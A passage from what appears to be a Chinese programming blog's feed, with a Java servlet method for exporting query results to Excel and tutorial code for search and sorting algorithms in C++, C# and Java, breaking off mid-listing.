class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exportProjects</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">boolean</span> status = <span class="keyword">false</span>;</span><br><span class="line">String rtnMsg = <span class="string">"项目信息导出失败"</span>;</span><br><span class="line">ServletOutputStream os = <span class="keyword">null</span>;</span><br><span class="line">System.out.println(<span class="string">"导出检索到的项目信息"</span>);</span><br><span class="line"></span><br><span class="line">fileName = request.getParameter(<span class="string">"filename"</span>);</span><br><span class="line">List&lt;ProjectCell&gt; projectList = getProjects(<span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">response.reset();</span><br><span class="line">response.setContentType(<span class="string">"application/msexcel;charset=UTF-8"</span>);</span><br><span class="line">response.setCharacterEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line"></span><br><span class="line">response.addHeader(<span class="string">"Content-Disposition"</span>, <span class="string">"attachment;filename=\""</span></span><br><span class="line">+ <span class="keyword">new</span> String(fileName.getBytes(<span class="string">"UTF-8"</span>), <span class="string">"ISO8859_1"</span>)</span><br><span class="line">+ <span class="string">"\""</span>);</span><br><span class="line">os = response.getOutputStream();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断格式</span></span><br><span class="line">String type = getPostfix(fileName);</span><br><span class="line">System.out.println(type);</span><br><span class="line"><span class="keyword">if</span> (type.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">status = <span class="keyword">false</span>;</span><br><span class="line">rtnMsg = <span class="string">"未知的文件格式"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">"xls"</span>)) &#123;</span><br><span class="line">writeXLS(os, projectList);</span><br><span class="line">status = <span class="keyword">true</span>;</span><br><span class="line">rtnMsg = <span class="string">"项目信息导出成功"</span>;</span><br><span class="line">os.flush();</span><br><span class="line">os.close();</span><br><span class="line"><span class="comment">// rtnMsg=file.getAbsolutePath().replace("\\", "/");</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">"xlsx"</span>)) &#123;</span><br><span class="line">writeXLSX(os, projectList);</span><br><span class="line">status = <span class="keyword">true</span>;</span><br><span class="line">rtnMsg = <span class="string">"项目信息导出成功"</span>;</span><br><span class="line">os.flush();</span><br><span class="line">os.close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">status = <span class="keyword">false</span>;</span><br><span class="line">rtnMsg = <span class="string">"不支持的文件格式:"</span> + type;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">status = <span class="keyword">false</span>;</span><br><span class="line">rtnMsg = <span class="string">"服务器文件不存在，请联系管理员"</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">status = <span class="keyword">false</span>;</span><br><span class="line">rtnMsg = <span class="string">"服务器文件操作IO异常，请联系管理员"</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (NullPointerException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">status = <span class="keyword">false</span>;</span><br><span class="line">rtnMsg = <span class="string">"空指针异常，请联系管理员"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取操作结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">String result = <span class="string">"&#123;success:"</span> + status + <span class="string">",rtnMsg:'"</span> + rtnMsg + <span class="string">"'&#125;"</span>;</span><br><span class="line">System.out.println(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>getProjects(&quot;&quot;,&quot;&quot;)</code> 方法是从<code>request</code>中取参数进行查询，返回<code>List</code>数组</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;环境：前台：&lt;code&gt;Extjs&lt;/code&gt;；后台&lt;code&gt;hibernate+struct&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;需求：前台查询结果分页显示，导出到&lt;code&gt;excel&lt;/code&gt;时需要导出&lt;strong&gt;所有符合查询条件&lt;/strong&gt;的记录。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Extjs" scheme="http://blog.lxzh.app/tags/Extjs/"/>
    
  </entry>
  
  <entry>
    <title>查找算法</title>
    <link href="http://blog.lxzh.app/2014/04/19/Lookup-Algorithm/"/>
    <id>http://blog.lxzh.app/2014/04/19/Lookup-Algorithm/</id>
    <published>2014-04-19T08:58:51.000Z</published>
    <updated>2018-07-30T02:51:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>&ensp; &ensp; &ensp; 本文集中了两种查找算法:<code>顺序查找算法</code>与<code>二分查找算法</code>，其中二分查找算法又有两种实现方式，分别为<strong>递归查找</strong>与<strong>迭代查找</strong>。</p><a id="more"></a><h1 id="顺序查找算法"><a href="#顺序查找算法" class="headerlink" title="顺序查找算法"></a>顺序查找算法</h1><h2 id="C-Code"><a href="#C-Code" class="headerlink" title="C++ Code"></a>C++ Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">OrderFind</span><span class="params">(<span class="keyword">int</span>* a,<span class="keyword">int</span> n, <span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a[i] == x)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Code-1"><a href="#C-Code-1" class="headerlink" title="C# Code"></a>C# Code</h2><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">OrderFind</span>(<span class="params"><span class="keyword">int</span>[] a, <span class="keyword">int</span> x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = a.Length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i] == x)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Java-Code"><a href="#Java-Code" class="headerlink" title="Java Code"></a>Java Code</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">OrderFind</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = a.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i] == x)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二分查找-对半-算法"><a href="#二分查找-对半-算法" class="headerlink" title="二分查找(对半)算法"></a>二分查找(对半)算法</h1><h2 id="C-Code-2"><a href="#C-Code-2" class="headerlink" title="C++ Code"></a>C++ Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//二分查找递归算法</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinarySearch</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> x, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> mid = (low+high)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (low &lt;= high)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a[mid] &lt; x) mid = BinarySearch(a, x, mid + <span class="number">1</span>, high);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (x &lt; a[mid]) mid = BinarySearch(a, x, low, mid - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//二分查找迭代算法</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinarySearch</span><span class="params">(<span class="keyword">int</span>* a,<span class="keyword">int</span> n, <span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> low = <span class="number">0</span>, high = n - <span class="number">1</span>,mid=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span> (low &lt;= high)</span><br><span class="line">&#123;</span><br><span class="line">mid = (low + high) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (x &lt; a[mid]) high = mid - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (x &gt; a[mid]) low = mid + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (a[mid] != x) mid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Code-3"><a href="#C-Code-3" class="headerlink" title="C# Code"></a>C# Code</h2><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//二分查找递归算法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">BinarySearch</span>(<span class="params"><span class="keyword">int</span>[] a, <span class="keyword">int</span> x, <span class="keyword">int</span> low, <span class="keyword">int</span> high</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = (low+high)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (low &lt;= high)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[mid] &lt; x) mid = BinarySearch(a, x, mid + <span class="number">1</span>, high);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; a[mid]) mid = BinarySearch(a, x, low, mid - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//二分查找迭代算法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">BinarySearch</span>(<span class="params"><span class="keyword">int</span>[] a, <span class="keyword">int</span> x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = a.Length;</span><br><span class="line">    <span class="keyword">int</span> low = <span class="number">0</span>, high = count - <span class="number">1</span>,mid=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high)</span><br><span class="line">    &#123;</span><br><span class="line">        mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; a[mid]) high = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (x &gt; a[mid]) low = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (a[mid] != x) mid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Java-Code-1"><a href="#Java-Code-1" class="headerlink" title="Java Code"></a>Java Code</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//二分查找递归算法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">BinarySearch</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> x, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = (low+high)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (low &lt;= high)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[mid] &lt; x) mid = BinarySearch(a, x, mid + <span class="number">1</span>, high);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; a[mid]) mid = BinarySearch(a, x, low, mid - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//二分查找迭代算法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">BinarySearch</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = a.length;</span><br><span class="line">    <span class="keyword">int</span> low = <span class="number">0</span>, high = count - <span class="number">1</span>,mid=-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high)</span><br><span class="line">    &#123;</span><br><span class="line">        mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; a[mid]) high = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (x &gt; a[mid]) low = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (a[mid] != x) mid = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><span><a>反馈请点击:</a><a target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=lKWmp62soKykoqLU5eW69-v5" style="text-decoration:none"><img src="http://rescdn.qqmail.com/zh_CN/htmledition/images/function/qm_open/ico_mailme_11.png" alt></a></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;ensp; &amp;ensp; &amp;ensp; 本文集中了两种查找算法:&lt;code&gt;顺序查找算法&lt;/code&gt;与&lt;code&gt;二分查找算法&lt;/code&gt;，其中二分查找算法又有两种实现方式，分别为&lt;strong&gt;递归查找&lt;/strong&gt;与&lt;strong&gt;迭代查找&lt;/strong&gt;。&lt;/p&gt;
    
    </summary>
    
    
      <category term="data structure" scheme="http://blog.lxzh.app/tags/data-structure/"/>
    
  </entry>
  
  <entry>
    <title>基础排序算法——汇总</title>
    <link href="http://blog.lxzh.app/2014/04/19/Basic-Sort-Algorithm-Summarizing/"/>
    <id>http://blog.lxzh.app/2014/04/19/Basic-Sort-Algorithm-Summarizing/</id>
    <published>2014-04-19T08:11:01.000Z</published>
    <updated>2017-02-18T15:41:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>&ensp; &ensp; &ensp; 本文集中汇总<code>冒泡排序</code>、<code>插入排序</code>、<code>对半插入排序</code>三种算法，并分别用<code>C++</code>、<code>C#</code>、<code>Java</code>三种语言实现。</p><a id="more"></a><h1 id="冒泡排序："><a href="#冒泡排序：" class="headerlink" title="冒泡排序："></a>冒泡排序：</h1><h2 id="C-Code"><a href="#C-Code" class="headerlink" title="C++ Code:"></a>C++ Code:</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BubbleSort</span><span class="params">(<span class="keyword">int</span>* a,<span class="keyword">int</span> n)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> tmp;  </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;=<span class="number">1</span> ;i--)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">if</span> (a[j] &gt; a[j + <span class="number">1</span>]) <span class="comment">//降序改为"" </span></span><br><span class="line">            &#123;  </span><br><span class="line">                tmp = a[j];  </span><br><span class="line">                a[j] = a[j + <span class="number">1</span>];  </span><br><span class="line">                a[j + <span class="number">1</span>] = tmp;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Code-1"><a href="#C-Code-1" class="headerlink" title="C# Code"></a>C# Code</h2><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">BubbleSort</span>(<span class="params"><span class="keyword">int</span> []array</span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> temp;  </span><br><span class="line">    <span class="keyword">int</span> count = array.Length;  </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=count;i&gt;=<span class="number">1</span> ;i--)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">if</span> (array[j] &gt; array[j + <span class="number">1</span>]) <span class="comment">//降序改为"&lt;" </span></span><br><span class="line">            &#123;  </span><br><span class="line">                temp = array[j];  </span><br><span class="line">                array[j] = array[j + <span class="number">1</span>];  </span><br><span class="line">                array[j + <span class="number">1</span>] = temp;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">BubbleSort</span>(<span class="params">List&lt;Int32&gt; array</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">int</span> count = array.Count;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = count; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (array[j] &gt; array[j + <span class="number">1</span>])<span class="comment">//降序改为"&lt;" </span></span><br><span class="line">            &#123;</span><br><span class="line">                temp = array[j];</span><br><span class="line">                array[j] = array[j + <span class="number">1</span>];</span><br><span class="line">                array[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Java-Code"><a href="#Java-Code" class="headerlink" title="Java Code"></a>Java Code</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span> []array)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> temp;  </span><br><span class="line">    <span class="keyword">int</span> count = array.length;  </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=count;i&gt;=<span class="number">1</span> ;i--)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">if</span> (array[j] &gt; array[j + <span class="number">1</span>])<span class="comment">//降序改为"&lt;"   </span></span><br><span class="line">            &#123;  </span><br><span class="line">                temp = array[j];  </span><br><span class="line">                array[j] = array[j + <span class="number">1</span>];  </span><br><span class="line">                array[j + <span class="number">1</span>] = temp;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(List&lt;Integer&gt;array)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> temp;  </span><br><span class="line">    <span class="keyword">int</span> count = array.size();  </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=count;i&gt;=<span class="number">1</span> ;i--)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">if</span> (array.get(j) &gt; array.get(j + <span class="number">1</span>)) <span class="comment">//降序改为"&lt;"  </span></span><br><span class="line">            &#123;  </span><br><span class="line">                temp = array.get(j);  </span><br><span class="line">                array.set(j, array.get(j + <span class="number">1</span>));  </span><br><span class="line">                array.set(j + <span class="number">1</span>,temp);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h1><h2 id="C-Code-2"><a href="#C-Code-2" class="headerlink" title="C++ Code"></a>C++ Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertSort</span><span class="params">(<span class="keyword">int</span>* a,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>,temp;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = a[i];</span><br><span class="line">j = i;</span><br><span class="line"><span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; a[j - <span class="number">1</span>] &gt;= temp)</span><br><span class="line">&#123;</span><br><span class="line">a[j] = a[j - <span class="number">1</span>];</span><br><span class="line">j -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">a[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Code-3"><a href="#C-Code-3" class="headerlink" title="C# Code"></a>C# Code</h2><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">InsertSort</span>(<span class="params"><span class="keyword">int</span>[] array</span>)  